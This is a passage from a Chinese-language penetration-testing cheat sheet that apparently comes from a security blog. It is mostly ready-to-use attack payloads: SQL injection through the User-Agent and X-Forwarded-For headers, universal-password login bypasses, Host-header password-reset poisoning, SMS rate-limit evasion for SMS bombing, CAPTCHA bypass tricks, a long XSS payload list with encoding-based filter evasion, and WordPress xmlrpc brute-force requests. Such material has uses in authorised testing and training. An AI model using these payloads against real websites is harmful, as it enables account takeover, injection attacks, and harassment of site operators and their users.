<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xss，sql注入</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>电子票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">会有越权查看等问题</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>支付</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传输过程中是否可以修改，如果是扫描二维码支付，我们可以分析一下二维码中的请求url看是否可以修改以后重新生成二维码</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>订单完成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">是否可以遍历订单</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>评价</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入、上传图片、xss</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="header头注入">Header头注入</h3>
<h5 id="host注入">HOST注入</h5>
<p>密码重置的中毒</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">提交找回密码表单，篡改其中的host头值。</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/1.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当用户收到密码重置邮件后，发现是钓鱼者的网址，且秘钥令牌也已参数id的形式传给给攻击者，此时攻击者可以直接使用受害者的令牌进行密码重置。</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/2.png" alt="1"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/2.png" alt="1"></p>
<h5 id="xss">XSS</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有些网站会根据HTTP_HOST字段来进行加载css样式表。如果要为固定的话，当域名发生改变时，那么站内所有的css即将失效。而且修改的时候也将的十分头疼，因为每个页面都会引用大量的公共资源。</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/3.png" alt="1"><br>
<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/4.png" alt="1"><br>
<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/5.png" alt="1"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/3.png" alt="1"><br>
<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/4.png" alt="1"><br>
<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/5.png" alt="1"></p>
<h5 id="x-forwarded-for注入">X-Forwarded-For注入</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大家有没有见过这样一种场景，当你对用户网站进行的爆破或者sql注入的时候，为了防止你影响服务器的正常工作，会限制你访问，当你再次访问时,会提示你的由于你的访问频过快或者您的请求有攻击行为,限制访问几个小时内不能登陆，并且重定向到一个错误友好提示页面。</span><br><span class="line">这样大概率的原因是，当你有攻击行为的时候,服务器把恶意用户的ip存入数据库。</span><br><span class="line">这样我们就可以利用对IP位置构造sql注入的Payload</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/6.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For通过这个字段我们可以控制绕过ip的限制，但是当我们去绕过ip限制的时候ip会带入数据库去查询，这点我们是不是可以尝试一下sql注入。</span><br></pre></td></tr></table></figure>
<p>​	<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/7.png" alt="157172437"></p>
<h5 id="user-agent注入">User-Agent注入</h5>
<ul>
<li>
<p>就放个<code>header</code>头文件，大家一看应该就懂了</p>
<p>例1</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.example.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1; Win64; x64; Trident/5.0)&amp;#x27;+(select*from(select(sleep(20)))a)+&amp;#x27; </span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, sdch</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.8,fr;q=0.6</span><br></pre></td></tr></table></figure>
<p>例2</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?do=login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Anka9080&amp;#x27;,(select(sleep(5))))#</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>csrftoken=zfPpDQbDhjPJ7Xbh8z3aMqAxhVv8vvCs</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="短信轰炸">短信轰炸</h3>
<p>​	如果抓包重放还是无法绕过时间限制的话可以在抓包的手机号后面添加：<code>\\n</code>空格等特殊字符来实现绕过限制(无限<code>\n</code>叠加</p>
<p>​	比如下面这个网站发送一个就要等1分钟</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/17.png" alt="2"></p>
<p>​	如果在后面加上空格就可以发送成功，然后无限加空格就能进行爆破了，可以看返回包的<code>date</code>数据结果为1分钟之内的</p>
<p>​	<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/18.png" alt="2"></p>
<p>​	<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/19.png" alt="2"></p>
<h3 id="登录后台绕过">登录后台绕过</h3>
<h5 id="利用万能密码">利用万能密码</h5>
<ul>
<li>
<p><code>Asp/Aspx</code>万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 1=1\--</span><br><span class="line">&#x27;&#x27;or 1=1\--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 1=1\--</span><br><span class="line">a&#x27;or&#x27; 1=1\--</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 1=1</span><br><span class="line">&#x27;OR 1=1%00</span><br><span class="line">&quot;or 1=1%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; or &#x27;a&#x27;=&#x27;a </span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>PHP</code>万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 1=1/*  字符型 GPC是否开都可以使用</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>JSP</code>万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="0-02-抓取返回包绕过">0×02 抓取返回包绕过</h5>
<p>​	<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/10.png" alt="1"><br>
​	<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/8.png" alt="1"><br>
<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/9.png" alt="1"></p>
<h3 id="验证码绕过">验证码绕过</h3>
<h5 id="0x01-图片验证">0x01 图片验证</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果是像google或者12306那种的图片验证码可以使用百度识图+google识图来识别绕过</span><br><span class="line">参考文章https://shuimugan.com/bug/view?bug_no=102178</span><br></pre></td></tr></table></figure>
<h5 id="0x02-参数绕过">0x02 参数绕过</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果有什么奇怪的参数不妨修改下，比如说true,-1,0,yes之类的参数不妨修改下说不定有奇效</span><br><span class="line">比如说&amp;XXXCode=True，直接改成&amp;XXXCode=False,或者置空参数&amp;XXXCode=,在或者删除参数</span><br></pre></td></tr></table></figure>
<h5 id="0x03-cookie绕过">0x03 Cookie绕过</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很多网站多次错误需要输入验证码的判断却源于cookie，很多是通过sessionid判断的</span><br><span class="line">这样的话直接清空Cookie的值就可以直接绕过验证码,有时候修改Cookie也可以绕过</span><br></pre></td></tr></table></figure>
<h5 id="0x04-url参数绕过">0x04 Url参数绕过</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有些网站如果你多次爆破就会出现验证码,但是有些会在Url里面多出某些参数</span><br><span class="line">比如原来的Url：www.baidu.com</span><br><span class="line">多次爆破出现的Url:www.baidu.com/?XXXcode=1</span><br></pre></td></tr></table></figure>
<h5 id="0x05-返回包绕过">0x05 返回包绕过</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">具体和渗透姿势总结-&gt;登录后台绕过里面-&gt;抓取返回包绕过相似</span><br></pre></td></tr></table></figure>
<h5 id="0x06-空验证码绕过">0x06 空验证码绕过</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个我没遇到过,听大佬说是应为代码逻辑的问题</span><br></pre></td></tr></table></figure>
<h5 id="0x07-常见的思路">0x07 常见的思路</h5>
<ul>
<li>验证码存在返回包中(手机验证码也遇到过存在返回包中的</li>
<li>验证码当做摆设(输不输入都没用</li>
<li>验证码是以加密数据包形式从服务器返回,不是以图片的形式(之前有一个大厂就是这操作，直接抓取解密爆破一气呵成</li>
<li>验证码在客户端生，然后和数据包一起发给后端验证(这开发的思路很迷</li>
<li>验证码可重用(前一个验证码后端没有做销毁,导致的重复利用</li>
<li>验证码出现基于IP出现的(换代理IP爆破,这种挺多的迷的很</li>
<li>验证码返回包改为溢出的数,他就会默认登录数据库第一个账号</li>
<li>验证码实时验证（这开发脑洞我真的服的一台糊涂生怕别人爆破不了自家后台，具体看下图<br>
<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/11.png" alt="1"><br>
<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/12.png" alt="1"><br>
<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/13.png" alt="1"><br>
<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/14.png" alt="1"></li>
</ul>
<h3 id="无过滤下的xss执行">无过滤下的XSS执行</h3>
<h4 id="scirpt">&lt;scirpt&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h4 id="img">&lt;img&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
<h4 id="input">&lt;input&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">竞争焦点，从而触发onblur事件</span><br><span class="line">&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;</span><br></pre></td></tr></table></figure>
<h4 id="details">&lt;details&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line">&lt;details open ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
<h4 id="svg">&lt;svg&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
<h4 id="select">&lt;select&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;select onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure>
<h4 id="iframe">&lt;iframe&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<h4 id="video">&lt;video&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
<h4 id="audio">&lt;audio&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
<h4 id="body">&lt;body&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body/onload=alert(&quot;xss&quot;);&gt;</span><br><span class="line">利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</span><br><span class="line">&lt;body</span><br><span class="line">onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>
<h4 id="textarea">&lt;textarea&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</span><br></pre></td></tr></table></figure>
<h4 id="keygen">&lt;keygen&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</span><br></pre></td></tr></table></figure>
<h4 id="marquee">&lt;marquee&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure>
<h4 id="isindex">&lt;isindex&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</span><br></pre></td></tr></table></figure>
<h4 id="link">&lt;link&gt;</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用link远程包含js文件</span><br><span class="line">在无CSP的情况下才可以</span><br><span class="line">&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</span><br></pre></td></tr></table></figure>
<h4 id="javascript伪协议">JavaScript伪协议</h4>
<ul>
<li>
<p>&lt;a&gt;标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>&lt;frame&gt;标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=javascript:alert(&#x27;xss&#x27;);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>&lt;img&gt;标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=javascript:alert(&#x27;xss&#x27;)&gt;//IE7以下</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>&lt;form&gt;标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="标签内的属性">标签内的属性</h4>
<ul>
<li>
<p>expression属性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img style=&quot;xss:expression(alert(&#x27;xss&#x27;&#x27;))&quot;&gt; // IE7以下</span><br><span class="line">&lt;div style=&quot;color:rgb(&#x27;&#x27;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下</span><br><span class="line">&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>background属性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="有过滤的情况下xss执行">有过滤的情况下XSS执行</h3>
<h4 id="过滤空格">过滤空格</h4>
<ul>
<li>
<p>用/代替空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="过滤关键字">过滤关键字</h4>
<ul>
<li>
<p>大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>双写关键字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="过滤-关键字">过滤&quot;关键字</h4>
<ul>
<li>
<p>利用<code>\</code>过滤<code>aaaa</code>的<code>&quot;</code>，接着是<code>//</code>注释<code>1</code>后面的字符串</p>
</li>
<li>
<p>原始的语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ss=aaaa&quot;+&quot;&amp;from=1&quot;+&quot;&amp;param=&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>构造的<code>payload</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ss=aaaa&quot;+&quot;&amp;from=1&quot;+&quot;&amp;param=&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>payload</code>可以拆分为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;ss=aaaa\&quot;+&quot;  工具人参数</span><br><span class="line">&amp;from=1  可控的参数</span><br><span class="line">//&quot;+&quot;&amp;param=&quot;  注释的参数</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="字符拼接">字符拼接</h4>
<ul>
<li>
<p>利用<code>eval</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>利用<code>top</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="其它字符混淆">其它字符混淆</h4>
<ul>
<li>
<p>有的<code>waf</code>可能是用正则表达式去检测是否有<code>xss</code>攻击，如果我们能<code>fuzz</code>出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;</span><br><span class="line">&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(`xss`);&quot;&gt; </span><br><span class="line">//因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="编码绕过">编码绕过</h4>
<ul>
<li>
<p>提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XSS 有时候对数据编码不一定要全部编码，编码单个字母或者隔着编码有奇效</span><br><span class="line">宽字符绕过</span><br><span class="line">&lt;scirpt&gt;alert(%c0%22xss%c0%22);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>Unicode</code>编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>url</code>编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>Ascii</code>码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>hex</code>绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>八进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&#x27;\170\163\163&#x27;)&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>base64</code>绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="过滤双引号-单引号">过滤双引号，单引号</h4>
<ul>
<li>
<p>当括号被过滤的时候可以使用<code>throw</code>来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="过滤url地址">过滤url地址</h4>
<h5 id="使用url编码">使用url编码</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt;</span><br></pre></td></tr></table></figure>
<h5 id="使用ip">使用IP</h5>
<ul>
<li>
<p>十进制IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>八进制IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>hex</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>html标签中用//可以代替http://</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>使用\</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>使用中文逗号代替英文逗号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;//会自动跳转到百度//会自动跳转到百度</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="xml">XML</h3>
<h4 id="账号密码爆破">账号密码爆破</h4>
<p>​	当看到这个返回值的时候文件类似于<code>http://XXXX/xmlrpc.php</code>的时候可以使用<code>XML</code>进行爆破账号密码</p>
<p>​	<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/15.png" alt="1"></p>
<ul>
<li>
<p>XML数据格式</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用结果如下</p>
